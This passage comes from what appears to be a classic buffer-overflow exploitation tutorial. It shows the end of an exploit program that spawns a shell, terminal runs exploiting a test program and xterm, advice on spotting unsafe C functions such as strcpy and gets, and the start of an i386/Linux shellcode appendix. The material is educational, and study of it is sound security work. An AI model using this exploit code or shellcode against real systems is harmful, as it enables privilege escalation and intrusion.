<a id=__codelineno-0-1383 name=__codelineno-0-1383 href=#__codelineno-0-1383></a>
<a id=__codelineno-0-1384 name=__codelineno-0-1384 href=#__codelineno-0-1384></a>  memcpy(egg,&quot;EGG=&quot;,4);
<a id=__codelineno-0-1385 name=__codelineno-0-1385 href=#__codelineno-0-1385></a>  putenv(egg);
<a id=__codelineno-0-1386 name=__codelineno-0-1386 href=#__codelineno-0-1386></a>  memcpy(buff,&quot;RET=&quot;,4);
<a id=__codelineno-0-1387 name=__codelineno-0-1387 href=#__codelineno-0-1387></a>  putenv(buff);
<a id=__codelineno-0-1388 name=__codelineno-0-1388 href=#__codelineno-0-1388></a>  system(&quot;/bin/bash&quot;);
<a id=__codelineno-0-1389 name=__codelineno-0-1389 href=#__codelineno-0-1389></a>}
<a id=__codelineno-0-1390 name=__codelineno-0-1390 href=#__codelineno-0-1390></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1391 name=__codelineno-0-1391 href=#__codelineno-0-1391></a>
<a id=__codelineno-0-1392 name=__codelineno-0-1392 href=#__codelineno-0-1392></a>   Lets try our new exploit with our vulnerable test program:
<a id=__codelineno-0-1393 name=__codelineno-0-1393 href=#__codelineno-0-1393></a>
<a id=__codelineno-0-1394 name=__codelineno-0-1394 href=#__codelineno-0-1394></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1395 name=__codelineno-0-1395 href=#__codelineno-0-1395></a>[aleph1]$ ./exploit4 768
<a id=__codelineno-0-1396 name=__codelineno-0-1396 href=#__codelineno-0-1396></a>Using address: 0xbffffdb0
<a id=__codelineno-0-1397 name=__codelineno-0-1397 href=#__codelineno-0-1397></a>[aleph1]$ ./vulnerable $RET
<a id=__codelineno-0-1398 name=__codelineno-0-1398 href=#__codelineno-0-1398></a>$
<a id=__codelineno-0-1399 name=__codelineno-0-1399 href=#__codelineno-0-1399></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1400 name=__codelineno-0-1400 href=#__codelineno-0-1400></a>
<a id=__codelineno-0-1401 name=__codelineno-0-1401 href=#__codelineno-0-1401></a>   Works like a charm. Now lets try it on xterm:
<a id=__codelineno-0-1402 name=__codelineno-0-1402 href=#__codelineno-0-1402></a>
<a id=__codelineno-0-1403 name=__codelineno-0-1403 href=#__codelineno-0-1403></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1404 name=__codelineno-0-1404 href=#__codelineno-0-1404></a>[aleph1]$ export DISPLAY=:0.0
<a id=__codelineno-0-1405 name=__codelineno-0-1405 href=#__codelineno-0-1405></a>[aleph1]$ ./exploit4 2148
<a id=__codelineno-0-1406 name=__codelineno-0-1406 href=#__codelineno-0-1406></a>Using address: 0xbffffdb0
<a id=__codelineno-0-1407 name=__codelineno-0-1407 href=#__codelineno-0-1407></a>[aleph1]$ /usr/X11R6/bin/xterm -fg $RET
<a id=__codelineno-0-1408 name=__codelineno-0-1408 href=#__codelineno-0-1408></a>Warning: Color name
<a id=__codelineno-0-1409 name=__codelineno-0-1409 href=#__codelineno-0-1409></a>&quot;°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤
<a id=__codelineno-0-1410 name=__codelineno-0-1410 href=#__codelineno-0-1410></a>
<a id=__codelineno-0-1411 name=__codelineno-0-1411 href=#__codelineno-0-1411></a>
<a id=__codelineno-0-1412 name=__codelineno-0-1412 href=#__codelineno-0-1412></a>
<a id=__codelineno-0-1413 name=__codelineno-0-1413 href=#__codelineno-0-1413></a>
<a id=__codelineno-0-1414 name=__codelineno-0-1414 href=#__codelineno-0-1414></a>
<a id=__codelineno-0-1415 name=__codelineno-0-1415 href=#__codelineno-0-1415></a>
<a id=__codelineno-0-1416 name=__codelineno-0-1416 href=#__codelineno-0-1416></a>
<a id=__codelineno-0-1417 name=__codelineno-0-1417 href=#__codelineno-0-1417></a>
<a id=__codelineno-0-1418 name=__codelineno-0-1418 href=#__codelineno-0-1418></a>ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°
<a id=__codelineno-0-1419 name=__codelineno-0-1419 href=#__codelineno-0-1419></a>
<a id=__codelineno-0-1420 name=__codelineno-0-1420 href=#__codelineno-0-1420></a>
<a id=__codelineno-0-1421 name=__codelineno-0-1421 href=#__codelineno-0-1421></a>
<a id=__codelineno-0-1422 name=__codelineno-0-1422 href=#__codelineno-0-1422></a>
<a id=__codelineno-0-1423 name=__codelineno-0-1423 href=#__codelineno-0-1423></a>
<a id=__codelineno-0-1424 name=__codelineno-0-1424 href=#__codelineno-0-1424></a>
<a id=__codelineno-0-1425 name=__codelineno-0-1425 href=#__codelineno-0-1425></a>
<a id=__codelineno-0-1426 name=__codelineno-0-1426 href=#__codelineno-0-1426></a>
<a id=__codelineno-0-1427 name=__codelineno-0-1427 href=#__codelineno-0-1427></a>¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿
<a id=__codelineno-0-1428 name=__codelineno-0-1428 href=#__codelineno-0-1428></a>
<a id=__codelineno-0-1429 name=__codelineno-0-1429 href=#__codelineno-0-1429></a>
<a id=__codelineno-0-1430 name=__codelineno-0-1430 href=#__codelineno-0-1430></a>
<a id=__codelineno-0-1431 name=__codelineno-0-1431 href=#__codelineno-0-1431></a>
<a id=__codelineno-0-1432 name=__codelineno-0-1432 href=#__codelineno-0-1432></a>
<a id=__codelineno-0-1433 name=__codelineno-0-1433 href=#__codelineno-0-1433></a>
<a id=__codelineno-0-1434 name=__codelineno-0-1434 href=#__codelineno-0-1434></a>
<a id=__codelineno-0-1435 name=__codelineno-0-1435 href=#__codelineno-0-1435></a>
<a id=__codelineno-0-1436 name=__codelineno-0-1436 href=#__codelineno-0-1436></a>°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ
<a id=__codelineno-0-1437 name=__codelineno-0-1437 href=#__codelineno-0-1437></a>
<a id=__codelineno-0-1438 name=__codelineno-0-1438 href=#__codelineno-0-1438></a>
<a id=__codelineno-0-1439 name=__codelineno-0-1439 href=#__codelineno-0-1439></a>
<a id=__codelineno-0-1440 name=__codelineno-0-1440 href=#__codelineno-0-1440></a>
<a id=__codelineno-0-1441 name=__codelineno-0-1441 href=#__codelineno-0-1441></a>
<a id=__codelineno-0-1442 name=__codelineno-0-1442 href=#__codelineno-0-1442></a>
<a id=__codelineno-0-1443 name=__codelineno-0-1443 href=#__codelineno-0-1443></a>
<a id=__codelineno-0-1444 name=__codelineno-0-1444 href=#__codelineno-0-1444></a>
<a id=__codelineno-0-1445 name=__codelineno-0-1445 href=#__codelineno-0-1445></a>¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤
<a id=__codelineno-0-1446 name=__codelineno-0-1446 href=#__codelineno-0-1446></a>
<a id=__codelineno-0-1447 name=__codelineno-0-1447 href=#__codelineno-0-1447></a>
<a id=__codelineno-0-1448 name=__codelineno-0-1448 href=#__codelineno-0-1448></a>
<a id=__codelineno-0-1449 name=__codelineno-0-1449 href=#__codelineno-0-1449></a>
<a id=__codelineno-0-1450 name=__codelineno-0-1450 href=#__codelineno-0-1450></a>
<a id=__codelineno-0-1451 name=__codelineno-0-1451 href=#__codelineno-0-1451></a>
<a id=__codelineno-0-1452 name=__codelineno-0-1452 href=#__codelineno-0-1452></a>
<a id=__codelineno-0-1453 name=__codelineno-0-1453 href=#__codelineno-0-1453></a>
<a id=__codelineno-0-1454 name=__codelineno-0-1454 href=#__codelineno-0-1454></a>ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°
<a id=__codelineno-0-1455 name=__codelineno-0-1455 href=#__codelineno-0-1455></a>
<a id=__codelineno-0-1456 name=__codelineno-0-1456 href=#__codelineno-0-1456></a>
<a id=__codelineno-0-1457 name=__codelineno-0-1457 href=#__codelineno-0-1457></a>
<a id=__codelineno-0-1458 name=__codelineno-0-1458 href=#__codelineno-0-1458></a>
<a id=__codelineno-0-1459 name=__codelineno-0-1459 href=#__codelineno-0-1459></a>
<a id=__codelineno-0-1460 name=__codelineno-0-1460 href=#__codelineno-0-1460></a>
<a id=__codelineno-0-1461 name=__codelineno-0-1461 href=#__codelineno-0-1461></a>
<a id=__codelineno-0-1462 name=__codelineno-0-1462 href=#__codelineno-0-1462></a>
<a id=__codelineno-0-1463 name=__codelineno-0-1463 href=#__codelineno-0-1463></a>¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿
<a id=__codelineno-0-1464 name=__codelineno-0-1464 href=#__codelineno-0-1464></a>
<a id=__codelineno-0-1465 name=__codelineno-0-1465 href=#__codelineno-0-1465></a>
<a id=__codelineno-0-1466 name=__codelineno-0-1466 href=#__codelineno-0-1466></a>
<a id=__codelineno-0-1467 name=__codelineno-0-1467 href=#__codelineno-0-1467></a>
<a id=__codelineno-0-1468 name=__codelineno-0-1468 href=#__codelineno-0-1468></a>
<a id=__codelineno-0-1469 name=__codelineno-0-1469 href=#__codelineno-0-1469></a>
<a id=__codelineno-0-1470 name=__codelineno-0-1470 href=#__codelineno-0-1470></a>
<a id=__codelineno-0-1471 name=__codelineno-0-1471 href=#__codelineno-0-1471></a>
<a id=__codelineno-0-1472 name=__codelineno-0-1472 href=#__codelineno-0-1472></a>°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ
<a id=__codelineno-0-1473 name=__codelineno-0-1473 href=#__codelineno-0-1473></a>
<a id=__codelineno-0-1474 name=__codelineno-0-1474 href=#__codelineno-0-1474></a>
<a id=__codelineno-0-1475 name=__codelineno-0-1475 href=#__codelineno-0-1475></a>
<a id=__codelineno-0-1476 name=__codelineno-0-1476 href=#__codelineno-0-1476></a>
<a id=__codelineno-0-1477 name=__codelineno-0-1477 href=#__codelineno-0-1477></a>
<a id=__codelineno-0-1478 name=__codelineno-0-1478 href=#__codelineno-0-1478></a>
<a id=__codelineno-0-1479 name=__codelineno-0-1479 href=#__codelineno-0-1479></a>
<a id=__codelineno-0-1480 name=__codelineno-0-1480 href=#__codelineno-0-1480></a>
<a id=__codelineno-0-1481 name=__codelineno-0-1481 href=#__codelineno-0-1481></a>¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤
<a id=__codelineno-0-1482 name=__codelineno-0-1482 href=#__codelineno-0-1482></a>
<a id=__codelineno-0-1483 name=__codelineno-0-1483 href=#__codelineno-0-1483></a>
<a id=__codelineno-0-1484 name=__codelineno-0-1484 href=#__codelineno-0-1484></a>
<a id=__codelineno-0-1485 name=__codelineno-0-1485 href=#__codelineno-0-1485></a>
<a id=__codelineno-0-1486 name=__codelineno-0-1486 href=#__codelineno-0-1486></a>
<a id=__codelineno-0-1487 name=__codelineno-0-1487 href=#__codelineno-0-1487></a>
<a id=__codelineno-0-1488 name=__codelineno-0-1488 href=#__codelineno-0-1488></a>
<a id=__codelineno-0-1489 name=__codelineno-0-1489 href=#__codelineno-0-1489></a>
<a id=__codelineno-0-1490 name=__codelineno-0-1490 href=#__codelineno-0-1490></a>ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿÿ¿°¤ÿ¿
<a id=__codelineno-0-1491 name=__codelineno-0-1491 href=#__codelineno-0-1491></a>
<a id=__codelineno-0-1492 name=__codelineno-0-1492 href=#__codelineno-0-1492></a>
<a id=__codelineno-0-1493 name=__codelineno-0-1493 href=#__codelineno-0-1493></a>
<a id=__codelineno-0-1494 name=__codelineno-0-1494 href=#__codelineno-0-1494></a>
<a id=__codelineno-0-1495 name=__codelineno-0-1495 href=#__codelineno-0-1495></a>
<a id=__codelineno-0-1496 name=__codelineno-0-1496 href=#__codelineno-0-1496></a>
<a id=__codelineno-0-1497 name=__codelineno-0-1497 href=#__codelineno-0-1497></a>
<a id=__codelineno-0-1498 name=__codelineno-0-1498 href=#__codelineno-0-1498></a>
<a id=__codelineno-0-1499 name=__codelineno-0-1499 href=#__codelineno-0-1499></a>°¤ÿ¿°¤ÿ¿°¤
<a id=__codelineno-0-1500 name=__codelineno-0-1500 href=#__codelineno-0-1500></a>Warning: some arguments in previous message were lost
<a id=__codelineno-0-1501 name=__codelineno-0-1501 href=#__codelineno-0-1501></a>$
<a id=__codelineno-0-1502 name=__codelineno-0-1502 href=#__codelineno-0-1502></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1503 name=__codelineno-0-1503 href=#__codelineno-0-1503></a>
<a id=__codelineno-0-1504 name=__codelineno-0-1504 href=#__codelineno-0-1504></a>   On the first try!  It has certainly increased our odds.  Depending how 
<a id=__codelineno-0-1505 name=__codelineno-0-1505 href=#__codelineno-0-1505></a>much environment data the exploit program has compared with the program 
<a id=__codelineno-0-1506 name=__codelineno-0-1506 href=#__codelineno-0-1506></a>you are trying to exploit the guessed address may be to low or to high. 
<a id=__codelineno-0-1507 name=__codelineno-0-1507 href=#__codelineno-0-1507></a>Experiment both with positive and negative offsets.
<a id=__codelineno-0-1508 name=__codelineno-0-1508 href=#__codelineno-0-1508></a>
<a id=__codelineno-0-1509 name=__codelineno-0-1509 href=#__codelineno-0-1509></a>
<a id=__codelineno-0-1510 name=__codelineno-0-1510 href=#__codelineno-0-1510></a>                              Finding Buffer Overflows
<a id=__codelineno-0-1511 name=__codelineno-0-1511 href=#__codelineno-0-1511></a>                              ~~~~~~~~~~~~~~~~~~~~~~~~
<a id=__codelineno-0-1512 name=__codelineno-0-1512 href=#__codelineno-0-1512></a>
<a id=__codelineno-0-1513 name=__codelineno-0-1513 href=#__codelineno-0-1513></a>   As stated earlier, buffer overflows are the result of stuffing more
<a id=__codelineno-0-1514 name=__codelineno-0-1514 href=#__codelineno-0-1514></a>information into a buffer than it is meant to hold.  Since C does not have any
<a id=__codelineno-0-1515 name=__codelineno-0-1515 href=#__codelineno-0-1515></a>built-in bounds checking, overflows often manifest themselves as writing past
<a id=__codelineno-0-1516 name=__codelineno-0-1516 href=#__codelineno-0-1516></a>the end of a character array.  The standard C library provides a number of
<a id=__codelineno-0-1517 name=__codelineno-0-1517 href=#__codelineno-0-1517></a>functions for copying or appending strings, that perform no boundary checking.
<a id=__codelineno-0-1518 name=__codelineno-0-1518 href=#__codelineno-0-1518></a>They include: strcat(), strcpy(), sprintf(), and vsprintf(). These functions 
<a id=__codelineno-0-1519 name=__codelineno-0-1519 href=#__codelineno-0-1519></a>operate on null-terminated strings, and do not check for overflow of the 
<a id=__codelineno-0-1520 name=__codelineno-0-1520 href=#__codelineno-0-1520></a>receiving string.  gets() is a function that reads a line from stdin into 
<a id=__codelineno-0-1521 name=__codelineno-0-1521 href=#__codelineno-0-1521></a>a buffer until either a terminating newline or EOF.  It performs no checks for
<a id=__codelineno-0-1522 name=__codelineno-0-1522 href=#__codelineno-0-1522></a>buffer overflows.  The scanf() family of functions can also be a problem if 
<a id=__codelineno-0-1523 name=__codelineno-0-1523 href=#__codelineno-0-1523></a>you are matching a sequence of non-white-space characters (%s), or matching a 
<a id=__codelineno-0-1524 name=__codelineno-0-1524 href=#__codelineno-0-1524></a>non-empty sequence of characters from a specified set (%[]), and the array 
<a id=__codelineno-0-1525 name=__codelineno-0-1525 href=#__codelineno-0-1525></a>pointed to by the char pointer, is not large enough to accept the whole 
<a id=__codelineno-0-1526 name=__codelineno-0-1526 href=#__codelineno-0-1526></a>sequence of characters, and you have not defined the optional maximum field 
<a id=__codelineno-0-1527 name=__codelineno-0-1527 href=#__codelineno-0-1527></a>width.  If the target of any of these functions is a buffer of static size, 
<a id=__codelineno-0-1528 name=__codelineno-0-1528 href=#__codelineno-0-1528></a>and its other argument was somehow derived from user input there is a good
<a id=__codelineno-0-1529 name=__codelineno-0-1529 href=#__codelineno-0-1529></a>posibility that you might be able to exploit a buffer overflow.
<a id=__codelineno-0-1530 name=__codelineno-0-1530 href=#__codelineno-0-1530></a>
<a id=__codelineno-0-1531 name=__codelineno-0-1531 href=#__codelineno-0-1531></a>   Another usual programming construct we find is the use of a while loop to
<a id=__codelineno-0-1532 name=__codelineno-0-1532 href=#__codelineno-0-1532></a>read one character at a time into a buffer from stdin or some file until the
<a id=__codelineno-0-1533 name=__codelineno-0-1533 href=#__codelineno-0-1533></a>end of line, end of file, or some other delimiter is reached.  This type of
<a id=__codelineno-0-1534 name=__codelineno-0-1534 href=#__codelineno-0-1534></a>construct usually uses one of these functions: getc(), fgetc(), or getchar().
<a id=__codelineno-0-1535 name=__codelineno-0-1535 href=#__codelineno-0-1535></a>If there is no explicit checks for overflows in the while loop, such programs 
<a id=__codelineno-0-1536 name=__codelineno-0-1536 href=#__codelineno-0-1536></a>are easily exploited.
<a id=__codelineno-0-1537 name=__codelineno-0-1537 href=#__codelineno-0-1537></a>
<a id=__codelineno-0-1538 name=__codelineno-0-1538 href=#__codelineno-0-1538></a>   To conclude, grep(1) is your friend.  The sources for free operating
<a id=__codelineno-0-1539 name=__codelineno-0-1539 href=#__codelineno-0-1539></a>systems and their utilities is readily available.  This fact becomes quite
<a id=__codelineno-0-1540 name=__codelineno-0-1540 href=#__codelineno-0-1540></a>interesting once you realize that many comercial operating systems utilities
<a id=__codelineno-0-1541 name=__codelineno-0-1541 href=#__codelineno-0-1541></a>where derived from the same sources as the free ones.  Use the source d00d.
<a id=__codelineno-0-1542 name=__codelineno-0-1542 href=#__codelineno-0-1542></a>
<a id=__codelineno-0-1543 name=__codelineno-0-1543 href=#__codelineno-0-1543></a>
<a id=__codelineno-0-1544 name=__codelineno-0-1544 href=#__codelineno-0-1544></a>     Appendix A - Shellcode for Different Operating Systems/Architectures
<a id=__codelineno-0-1545 name=__codelineno-0-1545 href=#__codelineno-0-1545></a>     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<a id=__codelineno-0-1546 name=__codelineno-0-1546 href=#__codelineno-0-1546></a>
<a id=__codelineno-0-1547 name=__codelineno-0-1547 href=#__codelineno-0-1547></a>i386/Linux
<a id=__codelineno-0-1548 name=__codelineno-0-1548 href=#__codelineno-0-1548></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1549 name=__codelineno-0-1549 href=#__codelineno-0-1549></a>        jmp    0x1f
<a id=__codelineno-0-1550 name=__codelineno-0-1550 href=#__codelineno-0-1550></a>        popl   %esi
<a id=__codelineno-0-1551 name=__codelineno-0-1551 href=#__codelineno-0-1551></a>        movl   %esi,0x8(%esi)
<a id=__codelineno-0-1552 name=__codelineno-0-1552 href=#__codelineno-0-1552></a>        xorl   %eax,%eax
<a id=__codelineno-0-1553 name=__codelineno-0-1553 href=#__codelineno-0-1553></a>    movb   %eax,0x7(%esi)
<a id=__codelineno-0-1554 name=__codelineno-0-1554 href=#__codelineno-0-1554></a>        movl   %eax,0xc(%esi)
<a id=__codelineno-0-1555 name=__codelineno-0-1555 href=#__codelineno-0-1555></a>        movb   $0xb,%al
<a id=__codelineno-0-1556 name=__codelineno-0-1556 href=#__codelineno-0-1556></a>        movl   %esi,%ebx
<a id=__codelineno-0-1557 name=__codelineno-0-1557 href=#__codelineno-0-1557></a>        leal   0x8(%esi),%ecx
<a id=__codelineno-0-1558 name=__codelineno-0-1558 href=#__codelineno-0-1558></a>        leal   0xc(%esi),%edx
